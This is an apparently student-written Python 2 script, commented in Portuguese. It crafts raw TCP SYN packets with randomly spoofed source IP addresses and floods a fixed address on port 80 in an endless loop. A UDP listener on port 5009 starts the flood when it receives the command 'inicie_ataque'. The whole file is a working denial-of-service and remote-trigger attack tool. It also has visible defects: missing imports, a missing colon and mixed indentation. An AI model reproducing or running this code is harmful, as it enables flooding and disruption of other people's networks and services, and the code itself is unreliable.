import sys
from threading import Thread



def funcao_attack():

	# checksum functions needed for calculation checksum
	def checksum(msg):
	    s = 0
	    # loop taking 2 characters at a time
	    for i in range(0, len(msg), 2):
	        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
	        s = s + w
	     
	    s = (s>>16) + (s & 0xffff);
	    #s = s + (s >> 16);
	    #complement and mask to 4 byte short
	    s = ~s & 0xffff
	     
	    return s
	 
	#create a raw socket
	try:
	    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	except socket.error , msg:
	    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
	    sys.exit()
	 
	# tell kernel not to put in headers, since we are providing it
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	     
	# now start constructing the packet
	packet = '';
	 
	#atacando proprio roteador

	#gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
	#para evitar que sejam todos 255 ou tenha 0.0.0.0
	#source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
	source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
	print 'IP aleatorio gerado: ', source_ip
	#dest_ip = '192.168.0.101' # victor
	dest_ip = '192.168.43.1' # gabriel
	 
	# ip header fields
	ihl = 5
	version = 4
	tos = 0
	tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
	id = 30  #Id of this packet
	frag_off = 0
	ttl = 255
	protocol = socket.IPPROTO_TCP
	check = 10  # python seems to correctly fill the checksum
	saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if you want to
	daddr = socket.inet_aton ( dest_ip )
	 
	ihl_version = (version << 4) + ihl
	 
	# the ! in the pack format string means network order
	ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
	 
	# tcp header fields
	source = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
	print 'Porta aleatoria gerada: ', source
	dest = 80   # destination port
	seq = 0
	ack_seq = 0
	doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
	#tcp flags
	fin = 0
	syn = 1 #Setando a flag syn do pacote tcp
	rst = 0
	psh = 0
	ack = 0
	urg = 0
	window = 5000
	check = 0
	urg_ptr = 0
	 
	offset_res = (doff << 4) + 0
	tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
	 
	# the ! in the pack format string means network order
	tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
	 
	# pseudo header fields
	source_address = socket.inet_aton( source_ip )
	dest_address = socket.inet_aton(dest_ip)
	placeholder = 0
	protocol = socket.IPPROTO_TCP
	tcp_length = len(tcp_header)
	 
	psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
	psh = psh + tcp_header;
	 
	tcp_checksum = checksum(psh)
	 
	# make the tcp header again and fill the correct checksum
	tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
	 
	# final full packet - syn packets dont have any data
	packet = ip_header + tcp_header
	 
	#Send the packet finally - the port specified has no effect
	print 'O servidor',dest_ip,'esta sendo atacado'
	 
	#put the above line in a loop like while 1: if you want to flood
	while True:
	    s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target


def escutando():
	from socket import socket, gethostbyname, AF_INET, SOCK_DGRAM
	PORT_NUMBER = 5009
	SIZE = 1024
	hostName = gethostbyname( '0.0.0.0' )
	mySocket = socket( AF_INET, SOCK_DGRAM )
	mySocket.bind( (hostName, PORT_NUMBER) )

	print 'Escutando',PORT_NUMBER
	
	while True:
	    (data,addr) = mySocket.recvfrom(SIZE)
            if data == 'inicie_ataque'
            	funcao_attack()


escutando1 = Thread(target=escutando)

escutando1.start()

